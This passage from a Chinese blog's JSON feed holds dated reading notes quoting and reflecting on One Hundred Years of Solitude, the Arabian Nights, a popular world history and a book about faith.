href=\"#3-13\">#</a> 3-13</h3>\n<p>直到那个时候为止，战争只不过是一个用来称呼某种遥远而又模糊的景况的字样，现在却一下子在剧烈的现实生活中具体化了。</p>\n<p>在他生命的最后两小时内，他没有弄明白为什么从童年时代就一直折磨她的那种恐惧就突然消失了，在对人生的严肃回顾中，他开始明白自己其实是多么热爱过去被他憎恨的人们。</p>\n<p>比起当年出走时，他的脸色更苍白，身材高了点，而性格则愈加孤僻了。</p>\n<p>人们刚把霍塞・阿卡迪奥的尸体抬出，雷蓓卡就紧紧关上家里的大门，把自己活埋了，她身上披着蔑视一切的厚厚的盔甲，这是世间任何诱惑都无法刺破的。</p>\n<p>他长时间地超然于这场没有前途的可怕战争之外，在押韵的诗句中重温他那些濒临死亡边缘的经历。</p>\n<p>在这幢房子里找到了安宁。在这所屋子里，一种不可抑止的联想力使她回忆过去的事情来历历在目，它们像活生生的人物在关闭的房间里悠然穿行。</p>\n<p>你如此憎恨军人，跟他们打了这么多年的仗，对他们琢磨了那么久，到头来还是成为了同他们一样的人。人生没有比这更卑贱的理想了。</p>\n<p>随着战争的激化和延伸，他的形象渐渐模糊起来，变得好像他是处在另一个世界似的。他说话的声音，语气也越来越飘忽不定，难以捉摸，后来竟混杂起来，变成逐渐失去一切意义的词语。</p>\n<p>那些以前是一些现实的活动，是他青壮期时期不可克制的热情的东西，现在对他来说，已经变成了遥远的事情：一件虚无缥缈的事。</p>\n<p>四年中他不断向她表白自己的心迹，而她却也总是找得到拒绝他的求爱又不伤害他感情的方法，因为她尽管不爱他，到头来在生活中却也不能没有他了。</p>\n<p>她身上一阵发冷，刺鼻透心，这冷气即使在太空当空的时候也折磨着他，使他好几个月都不得安睡，知道成了他的一种习惯感觉。陶醉于权力的心情在阵阵冷颤中开始变的索然乏味。</p>\n<h3 id=\"3-14\"><a class=\"markdownIt-Anchor\" href=\"#3-14\">#</a> 3-14</h3>\n<p>他到处都遇到青年们用他的眼睛看他，用他的声音同他说话，用他向他们打招呼时那种同样不信任的神态向他致敬，并且说他们是他的儿子，他只觉得自己被分散在各处，被重复着，感到从未有过的孤独。</p>\n<p>他得发动三十二次战争，撕毁所有同死神签署的协议，像猪那样在荣誉的垃圾堆里打滚，终于晚了整整四年才发现简朴单纯的特有的好处。</p>\n<p>实际上，最近两年中他又把自己的最后一点经历都付与了生活，包括暮年的生活。</p>\n<p>他没有察觉到时光在家里造成的细微而又令人心碎的破坏，这么长日子外出之后，对任何一个有着清晰记忆的人来说，这种破坏都会觉得是一种灾难。</p>\n<p>他发觉这半个多世纪以来，日常生活的重担在他身上留下了多少深深浅浅的爪印鞭痕，多少大大小小的创伤，溃疡和瘢耙。</p>\n<p>在家族的漫长历史上，这名字的一次又一次的重复使她得出了她认为是无可争辩的结论：奥雷良诺们都离群索居，却头脑出众；而霍塞・阿卡迪奥们则感情冲动而有闯荡精神，但都打上了悲剧的印记。</p>\n<p>因为那种遗传的印象代代相传，从他祖父的记忆那里传到了他的闹钟。</p>\n<p>他慢慢断绝了跟国家现实生活的一切接触。他关在自己的工作间，唯一与外界联系的就是他的小金鱼的买卖。</p>\n<p>这些活儿他必须聚精会神的干，结果他就没有余暇抱怨战争带来的失望了。</p>\n<p>照他的天性，他将注定成为谨慎内向，落落寡合的人，喜欢一个人沉思默想。</p>\n<p>孤独筛选了她的记忆，燃尽了一大堆蠢梦的怀念 ----- 那是生活聚集在她心中的垃圾，而同时又精炼切升华了另外一些痛苦的回忆，并使之永存于脑际。</p>\n<p>她含辛茹苦这么多年好不容易才获得了这一安于孤独的殊荣，她不准备放弃它而去换取一个被虚假而迷人的怜悯所扰乱的晚年。</p>\n<h3 id=\"3-15\"><a class=\"markdownIt-Anchor\" href=\"#3-15\">#</a> 3-15</h3>\n<p>老女佣把一把上次的战争就作废了的，而她却一直以为还在使用的钱币交给他们。这时人们才知道她跟人世间的隔绝已经到了何种地步！大家知道，只要她还有一口气，就不可能把她从那顽固的禁锢中解救出来。</p>\n<p>上帝似乎决意要考验一下人们全部的惊讶能力，他让马贡多的人们总是处于不停的摇摆和游移之中，一会儿高兴，一会儿失望；一会儿百思不解，一会儿疑团冰释，以至于谁也搞不清现实的界限究竟在哪里。</p>\n<p>她依然是个妩媚少女，她把那些清规戒律越来越拒之门外，对邪恶和猜疑则越来越不屑一顾，悠悠自得于自己的小天地的简单现实之中。</p>\n<p>对她来说，这种孤独的灌肠举止毫无肉欲的意味，而只是一种打发时间、消化食物的方式而已。</p>\n<p>那里的宁静仿佛来自另一个世界，一个尚未启用的事件，所以还不会传递声音。</p>\n<p>俏姑娘雷梅泰斯虽然没有背上十字架，却又开始在孤独的荒漠里，游荡了。她在没有噩梦的睡眠里，在没完没了的水浴中，在没有定时的饮食中，在没有回忆的深沉而长久的沉默中一点点成熟起来。</p>\n<p>他感到的不是悲痛，而是一种无可名状的暴怒，不知向谁去发泄，他越来越感到力不从心。他茫然若失，迷了路的来到了别人的家中，这里没有一件事，没有一个人能激起他对亲切感情的回忆。</p>\n<p>家里的每个成员每天都在不知不觉地重复着同样的行程，同样的动作，以至于在同样的时刻说着几乎同样的话。只要他们一不小心越出这一审慎的常规，就有丢失东西的危险。</p>\n<p>在无法穿透的老年的孤寂中，她却是那么的敏锐，足以洞察家中发生的最微不足道的事情。这种洞察力使她第一次看到了过去由忙乱而不能看到的真相。</p>\n<p>所有这一切都是她无比强烈的爱情与不可战胜的怯弱之间的殊死搏斗，而最后却是那种荒谬的恐惧占了上风，阿玛兰塔的这种害怕感情始终凌驾于她自己那颗备受折磨的心。</p>\n<h3 id=\"3-16\"><a class=\"markdownIt-Anchor\" href=\"#3-16\">#</a> 3-16</h3>\n<p>他毫无畏惧地向上帝发问，他是不是真的以为人的身体是铁打的，忍受得了那么多的痛苦和折磨。问着问着，她自己也糊涂起来了。</p>\n<p>她每隔十五天给孩子们写一封内容详尽的书信，其中，没有一句是真的。她对孩子们总是隐瞒着自己的痛苦，总是避而不谈家里的伤心事。</p>\n<p>她的生命就消磨在刺绣裹尸布上了，据说她是白天绣，晚上拆。她并不想以这种方式去打破孤独，相反，想以这种方式来保持孤独。</p>\n<p>由于不可能像别的事情，他已学会了冷静的进行思考，免得那些无法避免的回忆刺痛了自己的心。</p>\n<p>阿玛兰塔因过分纠缠在自己回忆往事的乱麻里，而没有理会这些释义的微妙含义。往事还历历在目，她却已经跨入了暮年。</p>\n<p>觉得自己像年轻时一样真想哭，似乎这流逝的岁月和那些教训对她一点儿也不起什么作用。</p>\n<p>有时候，她因自己那股不幸的溪流涓涓流淌而感到难过，有时候她感到极大的愤怒，只好用针去刺自己的手指，但是最使她痛苦，最使她愤怒和最使她感到心酸的却是爱情这颗芳香的，被虫蛀蚀的番石榴树正步步濒临死亡。</p>\n<p>她在这项工作上的专心致志已经给了她承认失败所需要的震惊。正是这个时候她才懂得了奥雷良诺制作那些小金鱼时的恶性循环的实质。现在，整个世界缩小到了她的皮肤的表面，而她的内心已经摆脱了所有的痛苦。</p>\n<p>但是梅梅什么都不说。她是那么自信，那么死死的抱住自己的孤独不放，奥雷良诺第二感到他们父女之间已经不存在任何联系，而那种同伴加同谋的关系只不过是往昔的幻象而已。</p>\n<p>她早就感到自己过分专横，却不知道如何弥补，因为她越是想办法解决，越是觉得这些办法不合情理。</p>\n<h3 id=\"3-17\"><a class=\"markdownIt-Anchor\" href=\"#3-17\">#</a> 3-17</h3>\n<p>这场暴风雨对菲南达来说，本来是无关紧要的。因为说穿了，她的一生就好像一只在下雨似的。她从来没有改变过作息时间，也没有放松过礼仪家规。</p>\n<p>每天从早起忙到睡觉，总有那么多事情要做，总要忍受，处理那么多的事情，到上床睡觉时两眼都像是占满了玻璃粉。</p>\n<p>菲南达做梦也没有想到他干活会这么卖力，所以当她看到他干活的样子后，便觉得他的鲁莽原来就是勤勉，他的贪婪原来就是忘我，他的顽固原来就是坚毅。</p>\n<p>带着和先辈们一样的神态坐着，他们沉默而冷漠，对时间和灾难而木然处之。他们在失眠症结束之后是这样，在奥雷良诺上校发动的三十二次战争以后也是这样，始终是一副半死不活的模样。</p>\n<p>在她那个时代所看不到的那种逆来顺受和忧郁的精神状态威胁着整个家族。</p>\n<p>我想尽办法让你学好，可是到头来你还是像猪一样过日子。</p>\n<p>他陷进了一个比她所生活的世界更加黑暗的世界，这世界跟她曾祖父呆过的世界一样孤寂，一样不可逾越。</p>\n<p>恻隐之心以及贫困生活带来的患难与共的感情，被她错当成了爱情。</p>\n<p>他怀着那个不解的谜团深入到她的感情中探索，寻觅他感兴趣的东西，却找到了爱情，因为他希望她爱他，结果爱上了他。</p>\n<p>自从大雨以来一切就是如此。人们的怠惰和健忘的贪婪形成了对照，对往事的记忆逐渐消失殆尽。</p>\n<p>时间也会有差错，也会出故障，它也能被撕成碎片，在一间屋子里留下一块永恒的碎片。</p>\n<p>这个沉默寡言的使人捉摸不透的女人，却从来未有人听到过她一句怨言。</p>\n<p>她乐意这样不停的，毫无怨言的走遍各个角落，把房子收拾得又整齐而干净。</p>\n<h3 id=\"3-18\"><a class=\"markdownIt-Anchor\" href=\"#3-18\">#</a> 3-18</h3>\n<p>他们仍然各自为政，在自己的孤独中生活，个人打扫自己的房间。</p>\n<p>她觉得日子时如此相像，竟不感到它的流逝。她不觉得等得不耐烦，反而对她们的拖延深感宽慰。</p>\n<p>长期的幽禁生活，对外界情况的缺乏了解以及俯首听命的习惯，早已使它内心反抗的种子枯萎了。</p>\n<p>他和菲南达都从未想到过，他们之间的通信时在交流各自的想象。</p>\n<p>他的发作倒不是因为这场浩劫，而是因为在纵情狂欢之中他感到了无法慰藉的空虚，他对自己感到厌恶，感到遗憾。</p>\n<p>只要看他一眼，哪怕是在半黑的客厅中，也能看出使他活着的秘密力量，并不是求生的本能，而是长期的恐惧。</p>\n<p>这些是她唯一能吃的东西，她无处可去也无人可访。</p>\n<p>她自己制造一些家务问题，然后再去解决；搞坏一些事情，第二天再去纠正，这种病态的勤奋使人想起了菲南达做好了拆，拆了再做的恶习。</p>\n<p>他如饥似渴的看书，天天熬到了深夜，虽然从他的阅读方式看，加斯东觉得他买书不是为了吸取知识，而是证实自己已有知识的正确性。</p>\n<p>找了替身也没能使他摆脱内心的渴望，而且随着经验使爱情的前景越来越广阔，这种渴望越来越使他心肺绞痛。</p>\n<p>她患有一种喜欢开门关门的怪癖，她那永恒的微笑仿佛是顾客们的轻信引起的；他们把这个只存在于想象之中的场所当成了真实的地方。实际上，那里连看得见摸得着的东西都是虚幻的。</p>\n<p>刚开始时，他一无所获，因为老板娘总是在爱情的最美妙时刻走进房间，对主人公们的种种乐趣横加评论，但是，时间长了他对这种世上的扫兴事就习以为常了。</p>\n<p>一种建立在无人相信的事实基础上的同谋关系，把奥雷良诺同加不列尔联系在一起，这种关系也影响到他们的生活，是他们俩在一个只剩下怀念的、行将就木的世界的回光返照之中随波逐流。</p>\n<h3 id=\"3-19\"><a class=\"markdownIt-Anchor\" href=\"#3-19\">#</a> 3-19</h3>\n<p>他想，加斯东之所以这样的俯首帖耳，可以在无节制的情欲中找到原因。但在对加斯东有了进一步的了解之后，他才明白加斯东的真实性格跟他的驯服的举动时矛盾的。</p>\n<p>她抛弃了计算年龄的恶习，并继续在静止的、脱离了回忆的时间之中，在完全揭示了的、确定的未来之中生活着，超脱了被纸牌骗人的窥伺和人算扰乱了的流年。</p>\n<p>这个家族的历史时一架周而复始无法停息的机器，是一个转动着的轮子，这只齿轮，要不是轴会逐渐不可避免的损失的话，会永远旋转下去。</p>\n<p>无论他们到什么地方去，都应该记住，过去都是假的，回忆是一条没有归途的路，一切以往的春天都是无法复原的，那最狂乱而最坚韧的爱情归根结底也不过是一种瞬息即逝的现实。</p>\n<p>这是马贡多过去所遗留下来的最后一点东西，他的毁灭尚未完成，因为她还在无限期的毁灭下去，在自身中不断消耗，它每一分钟都在结束自己，但永远也结不了。镇子死气沉沉到了极点。</p>\n<p>被孤独的爱情以及爱情的孤独囚禁在由于红蚂蚁的喧闹使人无法入睡的房子里，他们是唯一的幸福的生灵，是世界最幸福的人。</p>\n<p>他们俩失去了现实感，失去了时间概念，失去了日常饮食起居的节奏。他们重新关起了门窗，免得费时脱衣服。</p>\n<p>当她为自己的别出心裁而得意欢畅活着笑的要死的时候，奥雷良诺却变得越来越沉默了，因为他的热情时深思熟虑的。</p>\n<p>他俩就像漂浮在真空的世界中，而唯一日常的也是永恒的现实就是爱情。</p>\n<p>此刻，两个孤独的情人正在末日的时光里逆水行舟，那蛮横的，不详的时间徒劳地想把他俩推向失望和遗望的荒漠。</p>\n<h3 id=\"3-20\"><a class=\"markdownIt-Anchor\" href=\"#3-20\">#</a> 3-20</h3>\n<p>因为这镜子城在奥雷良诺・芭比罗尼亚译读出全本羊皮书的时刻，将被飓风刮走，并将从人们的记忆中完全消失。这手稿上所写的事情过去不曾，将来也不会重复。</p>\n",
            "tags": [
                "人生",
                "命运"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/18%E3%80%8A%E5%A4%A9%E6%96%B9%E5%A4%9C%E8%B0%AD%E3%80%8B%E7%BA%B3%E8%AE%AD/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/18%E3%80%8A%E5%A4%A9%E6%96%B9%E5%A4%9C%E8%B0%AD%E3%80%8B%E7%BA%B3%E8%AE%AD/",
            "title": "《天方夜谭》纳训",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>真正的正义只是存在于更高阶级，正义只是他们用于统治的一种工具。</p>\n<h3 id=\"3-20\"><a class=\"markdownIt-Anchor\" href=\"#3-20\">#</a> 3-20</h3>\n<p>阿里巴巴与四十大盗：阿里巴巴在山上砍柴时偶然发现强盗的藏金洞，其哥知道后因进洞取宝而被强盗杀害。强盗们为丢失财宝而多次上门报复，均被使妈尔基纳的勇敢和智慧化解。</p>\n<p>阿布・哈桑的梦：富商的肚子，第一次慷慨散财，看清了就肉朋友的真面目；第二次散财，遇见了装扮为外乡商人的国王，实现了心底的 “国王梦”，以国王的身份和权力惩治了四个恶教士。再度做这个梦时，认出了国王，赢回了娇妻。</p>\n<p>三姐妹的故事：穷苦的三姐妹心愿被国王实现，三妹成了王妃，两个姐姐因嫉成恨，略施小计，致三妹的三个孩子先继失踪，她自己也被囚禁。园林总管意外得到三子，认义子义女，终身款待。成年后，去寻找传说中的三件奇品，历经磨难得以掌控。巧遇国王，终于澄清了事实，再度团聚。</p>\n<p>神灯：法师阿拉灯开启密室取得神灯，并将指环送与其镇邪，在得到神灯之后法师被识破，只好关闭密室离去。阿拉灯利用指环逃出去并发现了神灯的力量，靠着它得到了想要的一切。法师逆袭，以新灯换旧灯夺取阿拉灯的一切，却被对方用安眠药得以利用，失去了神灯。其弟巫师巧杀妇人，伪装成神医接近阿拉丁，被识破，死在殿中。</p>\n<p>哈桑奇遇记：宰相两子争论，后大动肝火，二弟离去。到偏远地方，凭着优秀的大脑夺得宰相之位，并生有哈桑；大哥也得其国家的宰相位，育有一女，深受国王喜爱，因错事还使其女与马夫成婚。新婚夜，诡异出现的哈桑替代马卡完成了婚礼。翌日，哈桑消失不见。育有一子，待其成长，开始了艰辛的寻父之路。</p>\n<h3 id=\"3-21\"><a class=\"markdownIt-Anchor\" href=\"#3-21\">#</a> 3-21</h3>\n<p>辛德巴航海历险记：第一次在鲸鱼上烤火受到惩罚，借着木板漂到山洞遇到了御马师；第二次贪睡遗落到了荒岛，借着大腐鹏鸟离去；第三次去猴山之旅，宫殿中的独眼巨怪，丛林中的蛇；第四次，吃人肉的黑人，逃离到的奇怪风俗的国家，沦为妻子的陪葬人，靠杀人自救；第五次，因贪大鹏鸟的蛋，被驱逐，遇海上老人，靠美酒伤害了老人，买卖椰子；第六次，瘟疫蔓延，驾木船随波逐流。</p>\n<p>神马：虚伪的不现实文明，虚假的现实里寻求不可能的真爱，乘神马飞行，在天堂里遇见另一半，在享受中沦陷，对敌人的残害，对无罪者的欲加罪，当他们终于卸掉自己的枷锁后，面对的仍然是不公平。而真正的正义只是存在于更高阶级，正义只是他们用于统治的一种工具。</p>\n<p>渔夫赫利发的故事：所谓善良不过是懦弱，所谓勤劳不过是愚蠢。当辛辛苦苦得到的成果付之一炬，而面对他的不是财物的正回报，是那抽彩中的结局。成为国王与死亡也变成了一次赌博，而这也正是社会所需要的。他们不会让你知道真相，只想让你服从。</p>\n<p>渔夫的故事：除了不可能的机遇与无良心的迫害，成为一个公众人物真的很难，想一夜暴富除非失去某些东西。当为一己之欲而毁掉别人时，得到的是永久性的良心惩罚，若有一天招惹到了那些本该不存于当世的人，得到的是我们永远也想象不到的灾难。</p>\n<p>手艺人哈桑的故事：金钱和道德从来都不能让一个人过的更好，要想使一个人开心，就得充满希望，信心的面对每一天的生活，如果如此，那么每一天都将是我们梦寐以求的生活，好运和机遇从来不会为某人停留，只消我们感恩所拥有的一切就好，否则每一天都是无尽深渊。</p>\n<p>神童智审盗金案：当一切都真正公开的时刻，即便是毫无水平的小孩子也能像智者一样看清所有的真相。</p>\n",
            "tags": [
                "社会"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/19%E3%80%8A%E8%AE%A9%E4%BD%A0%E7%88%B1%E4%B8%8D%E9%87%8A%E6%89%8B%E7%9A%84%E6%9E%81%E7%AE%80%E4%B8%96%E7%95%8C%E5%8F%B2%E3%80%8B%E5%A7%9A%E5%B0%A7/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/19%E3%80%8A%E8%AE%A9%E4%BD%A0%E7%88%B1%E4%B8%8D%E9%87%8A%E6%89%8B%E7%9A%84%E6%9E%81%E7%AE%80%E4%B8%96%E7%95%8C%E5%8F%B2%E3%80%8B%E5%A7%9A%E5%B0%A7/",
            "title": "《让你爱不释手的极简世界史》姚尧",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他们要统治人类，宗教是必须的。即使没有一个上帝，也要造出一个上帝。</p>\n<h3 id=\"3-22\"><a class=\"markdownIt-Anchor\" href=\"#3-22\">#</a> 3-22</h3>\n<p>在人类早期为何会产生一个 “平等” 的原始社会呢？因为我们来自莽莽苍苍的丛林，大自然既是食物的来源，也是最大的敌人。所以，人们根本没有余暇来占有私有财产和划分等级。</p>\n<p>我们都来自丛林。只是有些人把办公室当成丛林，把商场和官场当成丛林。有人喜欢实实在在的丛林。人总是迷恋他最初诞生的那个地方。</p>\n<p>野蛮时代远比文明时代漫长而又血腥，那时，没有什么是安全的，最重要的是和同类在一起。同类有时也是残酷的，对于老弱病残不会怜惜，甚至还会吃掉它们的尸体。</p>\n<p>每个社会都有约定俗成的潜规则，破除潜规则首先从破除习俗开始，企图破除习俗的下场往往都很惨。</p>\n<p>经济决定地位：谁能为氏族和部落谋取最大利益，谁的地位也就最高。</p>\n<p>民族性往往起源于社会环境，而社会环境是对自然环境的模仿。</p>\n<p>法典较少人性，更多的是追求习俗所认为的公正。</p>\n<p>“法老” 这个词语正式出现是在古王国时期，国王不再叫国王，而应该叫做法老。国王只是一国之君之，法老不仅是君主，还是神的化身。</p>\n<p>独裁者都喜欢美化自己，神化自己，这是千古不变的铁律。我们没必要相信，就当是看喜剧。</p>\n<p>我们不能凭借现代人的感受来推测古代人，他们信息很少，心灵相当纯粹。</p>\n<p>地球并非人类所有，人类却是地球所有。不要陷入人类自我中心的陷阱。</p>\n<p>早期神话和传说有太多的相似性，也许他们出于更早的同一文明：亚特兰蒂斯。</p>\n<p>自由是大流士非常厌恶的一种东西，他当然不是不喜欢自由，他只是不喜欢别人自由而已，作为万王之王，他要求自己绝对自由，但是别人不可以自由。自由就像瘟疫，一旦流传开来，对于帝国的稳定是非常不利的。</p>\n<p>真理往往掌握在少数人手里，但是当多数人不同意少数人的时候，要么跟着大多数人一起灭亡，要么玩弄一些手段。</p>\n<h3 id=\"3-23\"><a class=\"markdownIt-Anchor\" href=\"#3-23\">#</a> 3-23</h3>\n<p>在错综复杂的现象世界背后有一个共同的唯一的本质。超弦理论和 M 理论着都试图将所有的物质现象纳入一个最简单的公式里，寻求宇宙最本源的 “存在”。</p>\n<p>这些知识不是他灌输给别人的，而是别人灵魂里已经有了的知识，怀上了知识的 “胎”，他只不过是通过辩论帮别人认识到知识，产下 “胎”。</p>\n<p>民主能否保障少数人的权利，民主会不会被庸众利用对付极少数优秀的人。</p>\n<p>在柏拉图看来：世界由两部分组成，一个是变化的感性世界，这个世界由纷繁错乱的现象构成，是不真实的，也是没什么价值的；一个是永恒不变的理念世界，这个世界是真实存在而且永恒不变的。感性世界不过是理念世界的影子，要认识理念一定要靠理性，光凭感性是不可能的。</p>\n<p>先验论：知识的获取只是回忆的一个过程，所有那些知识早已存在于灵魂里。</p>\n<p>人类身上存在着两大动力：原始的、野蛮的、兽性的本能和文明的、伦理的道德秩序。俄狄浦斯弑父聚母体现了原始本能与文明道德的冲突。</p>\n<p>我们是一群自由的人，而我们的对手不过是一群奴隶，我们承担着无比神圣的使命 — 捍卫自由。</p>\n<p>罗马对外国人始终恐惧又蔑视，正是因为恐惧，他们不断的征服和屠杀。边境的不安全感加强了他们对武力的重视，在他们看来，最好的防卫就是进攻。</p>\n<p>一个一辈子演戏的人必定是压抑的。不是因为他演戏所以压抑，而是因为压抑才演戏。</p>\n<p>罗马的长期混乱，就是因为宗教衰弱和道德滑坡。</p>\n<p>他们天性中有些非常狂躁和非理性的东西，权力场很容易激发出这种基因，一旦理智的控制失败，他们就开始胡作非为。</p>\n<p>凡是黑暗的东西都是让人好奇的。但是，当我们真正去接触的时候，也许会发现它并没有那么黑暗，也没有想象中的那么离奇怪诞。</p>\n<h3 id=\"3-24\"><a class=\"markdownIt-Anchor\" href=\"#3-24\">#</a> 3-24</h3>\n<p>宗教狂热有时候比政治狂热更恐怖。</p>\n<p>因为松散，所以相对自由；因为是整体，所以不会切断彼此之间的联系。</p>\n<p>伟人是时代造就的，什么土壤开什么花。</p>\n<p>理智的婚姻往往缺乏激情，缺乏激情往往意味着生命对生命的一种排斥。</p>\n<p>一个真正的统治者不必有任何的道德樊篱，为达目的可不择手段。</p>\n<p>懂一点比什么都不懂要更加危险。在政治上尤其如此，那些挑起人们情绪的人即使出于好意也是历史的罪人。</p>\n<p>在道德败坏，人性堕落、社会动荡不安的状态下，共和制度是无力的，只有建立起强者的专制统治才能扭转整个社会的衰败趋势。</p>\n<p>所有介绍都于作品本身都是无力的，一千个人眼里有一千个哈姆莱特。</p>\n<p>上帝是公平的，掌握命运的人永远站在天平的两端，被命运掌握的人仅仅明白上帝赐给他的命运。</p>\n<p>人类的本能是渴求扩展生存空间。民主也好，自由也好，人权也好，平等也好，都没法去掩饰生存斗争的残酷现实。</p>\n<p>他们要统治人类，宗教是必须的。即使没有一个上帝，也要造出一个上帝。</p>\n<p>孟德斯鸠认为自由并不是绝对的，而是在法律允许的范围内的自由。一个民族的性格、感情、道德和风俗同一个民族的政治制度有很大的关系，甚至一个国家领土的大小也深制影响着政治制度。</p>\n<p>国家起源于社会契约，君主的权力来自人们的契约，君主应约束自己的行为，履行对人民的契约。</p>\n<p>在自然环境中，人是没有道德和法律的，后来为了应付个人能力无法应付的环境，人们相互联合起来，共同组成社会，在社会的形成中，人与人之间便产生了契约。</p>\n<p>在自然环境中，人是没有道德和法律的，后来为了应付个人能力无法应付的处境，人们相互联合起来，共同组成社会，在社会的形成中，人与人之间便产生了契约。</p>\n<p>书本知识对真正的教育并不重要，情感的教育更甚于理性的教育，通过亲身经历比书上更有用。</p>\n<h3 id=\"3-25\"><a class=\"markdownIt-Anchor\" href=\"#3-25\">#</a> 3-25</h3>\n<p>人们愿意放弃个人自由并接受他人统治的唯一原因，是他们看到个人权利、快乐和财产在一个有正规政府的社会比在一个无政府的、人人只顾自己的社交能够得到更好的保护。</p>\n<p>社会中的统治者和富有者为了统治不惜 “欺骗” 大众，从而让不平等成为人类社会的一个永恒特点。</p>\n<p>为了消除罪恶，动用罪恶的手段只会带来更深的罪恶。</p>\n<p>一旦政权建立、社会稳定，上层和底层之间的流通就会变得越来越困难。</p>\n<p>资产阶级自由的虚伪性，认为所谓的自由只有富人才能享有，穷人的生活苦不堪言，哪里有时间自由。</p>\n<p>任何战争都不可能是一个人的事，你不是一个人在战斗 — 说得一点不错，战争是民族和国家矛盾的一种冲突。</p>\n",
            "tags": [
                "历史"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/13%E3%80%8A%E4%BA%BA%E8%A6%81%E6%9C%89%E7%82%B9%E4%BF%A1%E4%BB%B0%E3%80%8B%E6%9D%8E%E5%A4%A7%E4%BC%9F/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/13%E3%80%8A%E4%BA%BA%E8%A6%81%E6%9C%89%E7%82%B9%E4%BF%A1%E4%BB%B0%E3%80%8B%E6%9D%8E%E5%A4%A7%E4%BC%9F/",
            "title": "《人要有点信仰》李大伟",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我的信仰是无底深渊，澎湃着心中火焰，燃烧无尽的力量，那是忠诚所在。</p>\n<h3 id=\"2-126\"><a class=\"markdownIt-Anchor\" href=\"#2-126\">#</a> 2-126</h3>\n<p>如今，社会上低俗文化，利己主义，虚无主义，拜金主义泛滥，社会道德沦丧，人们的精神信仰迷失了。信仰的确能使人们真正地感受到自我存在的价值，使人生充满意义，使生命获得一种强大的生命力量，使灵魂获得一种永恒的寄托和无限的慰藉。</p>\n<p>没有信仰的人，只能醉生梦死，尸位素餐，得过且过。没有信仰的民族，只能是个人至上，金钱至上，利益至上，没有光明和前途。</p>\n<p>人活着就要用生命去解释自己的信仰。</p>\n<p>在一个普遍腐败的时代，腐败是腐败者的毒药，信仰却是信仰者的解毒剂。</p>\n<p>世界上有两样东西是亘古不变的，一是高悬在我们头顶上的日月星辰，一是每个人心底深藏的高贵信仰。</p>\n<h3 id=\"2-127\"><a class=\"markdownIt-Anchor\" href=\"#2-127\">#</a> 2-127</h3>\n<p>战争的暴力最多可以毁掉一个人，但是，信仰的缺失却往往可以毁掉一个民族。倘若缺乏理想和信仰，或者理想和信仰出了问题，轻则个人失去人生的目标，一生碌碌无为，重则整个国家，整个民族面临毁灭的危险。</p>\n<p>什么共产主义，这都是哄哄老百姓的空话。</p>\n<p>精神危机最严重的形态是信仰危机，即丧失了指导整个人生的根本信仰，一向被赋予最高价值的东西丧失了价值，人生失去了总体的意义和目标。用尼采的话说，就是虚无主义。</p>\n<p>一个民族如果全体都陷入某种理想主义的狂热，当然太天真，如果在它的青年人中竟然也难觅理想主义者，又实在太堕落了。</p>\n<p>在信仰缺失的年代，人们的精神无处寄托，疲劳或受伤的心灵得不到慰藉，就只好迷失在了饱暖思淫欲的空虚里。</p>\n<p>真正的信仰，能够提供给人们所追求的价值或意义以终极支撑，而人们的良知则更需要在信仰的土壤里植根与生长；而信仰的缺失或私人信仰横生，则会导致道德体系丧失最终的合法性基础，使人们在本质上向动物学沉沦。</p>\n<p>作为一个有思想的人，总是要有信仰的，或者是某种宗教的信仰，或者是某种学说的信仰，再或者是某种主义的信仰。</p>\n<p>单一的拜权、拜金、利己倾向，将会使整个社会陷入信仰真空和人人自危的恶性深渊。深入去思考问题的本质时就会发现，价值观的错乱，信仰的缺失，道德的沦丧，已经从根本上危及中华民族的未来前景了。</p>\n<p>欲望是生命的象征，得不到满足就会痛苦，满足后又会感到无聊，人就是在痛苦和无聊之间来回摇摆。</p>\n<p>人是欲望性的动物，最怕失落，最怕得不到。</p>\n<p>走入官场，名和利就会伴随着你。两根线系在一起，打成一个结，这一直是从政之人的一个心结。</p>\n<p>凡事都验以市场思维，人们富足后可能会牺牲更宝贵的东西。</p>\n<p>天下熙熙、皆为利来；天下攘攘、皆为利往。</p>\n<h3 id=\"2-128\"><a class=\"markdownIt-Anchor\" href=\"#2-128\">#</a> 2-128</h3>\n<p>宗教信仰虽然是一种唯心主义世界观，但他属于一种特殊的社会意识形态和文化现象，具有一系列理论经典，宗教仪式、规章制度等存在形式。在宗教中找到生命的本源和人生的价值，从而不会因为陷入无助的绝望而丧失生活的勇气。</p>\n<p>科学与宗教这两者并不是对立的，在每一个善于思索的人的心目中，它们是相互补充的。</p>\n<p>没有宗教的科学是跛脚的，没有科学的宗教是盲目的。</p>\n<p>人类对于客观世界的认识总是有限的，在现实的认识活动中，总是不能完全认识客观世界。因此，人类认识的有限性就是人们信仰宗教的客观根源。</p>\n<p>科学由于自身的局限性，不能回答人们的生存价值和人生意义等问题。</p>\n<p>宗教信仰是非功利的，信仰情感的表达不能通过金钱来衡量。</p>\n<p>每个人总不免有所迷恋，每个人总不免犯些错误，不过在进退失据，周围的一切开始动摇的时候，信仰就能拯救一个人。</p>\n<p>宗教信仰能通过对宗教神圣价值的推崇，以及对世俗价值的贬仰和宗教性忏悔等方式，对人们的不平衡心理进行调节和治疗，使人们的不平衡心理趋于平衡。</p>\n<p>现实生活中，弄虚作假，麻木不仁、见死不救，漠视人性，贪污腐败屡见不鲜。我们的泱泱大国竟然在现代社会丧失了一个自己统一的民族思想和信仰！其实，这就是我国当今社会一切丑恶现象滋生和蔓延的最大祸源。</p>\n<p>多数人在追逐物质和精神利益的过程中，逐渐忽略了对精神和信仰的追求，迷失了自己的信仰，找不到一个能让自己超脱的精神支柱。现在，多数人做的事情都有功利色彩。</p>\n<p>精神上的麻木比身体上的虚弱更加可怕。</p>\n<p>教育大纲的硬性规定，使教育工作者在解读的过程中逐渐走向公式化。既僵化了教育工作者的思维，也扼杀了学习者在学习过程中的创新意识。</p>\n<p>在强烈的追求欲，贪图欲，享乐欲望面前，人性在倒退，道德在滑坡，民族精神在淡化，大众信仰在消失。</p>\n<p>一个中国人是一条龙，一群中国人是一条虫。</p>\n<h3 id=\"3-3\"><a 